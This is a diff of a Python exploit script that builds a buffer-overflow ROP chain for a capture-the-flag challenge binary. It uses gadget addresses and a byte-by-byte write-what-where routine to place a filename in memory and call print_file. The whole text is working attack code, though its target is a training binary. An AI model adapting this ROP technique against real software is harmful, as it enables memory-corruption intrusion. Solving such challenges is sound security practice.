@@ -5,10 +5,9 @@ import struct
 # run < <(python challenge.py)
 deadcode = b'\xde\xc0\xad\xde'
 
-# Storing every byte since I have a one-byte write primitive here
-"""
+# Just my one-byte write
 payload_locations = [
-    b'\x50\xa0\x04\x08', 
+    b'\x50\xa0\x04\x08',
     b'\x51\xa0\x04\x08', 
     b'\x52\xa0\x04\x08', 
     b'\x53\xa0\x04\x08', 
@@ -16,28 +15,8 @@ payload_locations = [
     b'\x55\xa0\x04\x08', 
     b'\x56\xa0\x04\x08', 
     b'\x57\xa0\x04\x08', 
-    b'\x58\xa0\x04\x08', 
-    b'\x59\xa0\x04\x08',
-    b'\x60\xa0\x04\x08', 
-    b'\x61\xa0\x04\x08', 
-    b'\x62\xa0\x04\x08', 
-    b'\x63\xa0\x04\x08', 
-    b'\x64\xa0\x04\x08', 
-    b'\x65\xa0\x04\x08' 
+    b'\x58\xa0\x04\x08'
 ]
-"""
-# Just my one-byte write
-payload_locations = [
-    b'\x50\xa0\x04\x08'
-]
-# bytes I need:
-# 66 f     <-- 6c
-# 6c l
-# 61 a
-# 67 g
-# 2e .
-# 74 t
-# 78 x
 
 # 0x080485bb : pop ebp ; ret
 pop_ebp_ret = b'\xbb\x85\x04\x08'
@@ -57,17 +36,7 @@ def write_what_where(data, addr):
        0x08048555 xchg BYTE PTR [ecx],dl ; ret
        0x08048558 pop ecx ; bswap ecx ; ret
 
-    f -> U
-    l -> f (nice)
-    a -> \x92
-    g -> J
-    . -> \xdd
-    t -> f (nice...?)
-    x -> w
-    t -> f
-    c -> f
     """
-
     # the wacky gadget at 0x08048543 takes in ebp, does some black magic bitmasking,
     # and something comes out into edx. not going to try to understand
     # how it all works, just trying to build some input/output values
@@ -79,12 +48,9 @@ def write_what_where(data, addr):
 
     # load lowest byte of edx into the address at ecx.
     xchg_byte_ptr_ecx_dl_ret = b'\x55\x85\x04\x08'
-    
+  
     payload = pop_ebp_ret + \
-            bytes([data]) + \
-            bytes([data]) + \
-            bytes([data]) + \
-            bytes([data]) + \
+            data + \
             wacky_gadget + \
             pop_ecx_bswap_ecx_ret + \
             reverse_bytes(addr) + \
@@ -92,19 +58,29 @@ def write_what_where(data, addr):
 
     return payload
 
-def main(data):
+def main():
     # 0x080483d0  print_file@plt
     print_file = b'\xd0\x83\x04\x08'
     
     payload = b'A'*40
     payload += b'B'*4                # ebp
+
+    # precomputed by pext.py
+    bytes_to_write = [
+        b'\x6c\x6c\x6c\x6c',
+        b'\xdd\x06\x00\x00',
+        b'\x46\x5d\x00\x00',
+        b'\x5a\x4b\x00\x00',
+        b'\xdb\x05\x00\x00',
+        b'\x01\x7f\x7f\x7f',
+        b'\x01\xbd\x01\x01',
+        b'\x01\x7f\x7f\x7f',
+        b'\x00\x00\x00\x00' # null terminator
+    ]
    
-    """
-    for byte, addr in zip(data_to_write, payload_locations):
+    for byte, addr in zip(bytes_to_write, payload_locations):
         print(f"Writing {byte} at {addr.hex()}")
         payload += write_what_where(byte, addr)
-    """
-    payload += write_what_where(data, payload_locations[0])
     
     payload += print_file            # function to exec
     payload += deadcode              # return for print_file
@@ -113,5 +89,4 @@ def main(data):
     sys.stdout.buffer.write(payload)
 
 if __name__ == "__main__":
-    # Takes a single byte as an integer e.g. 0, 1, 2
-    main(int(sys.argv[1]))
+    main()
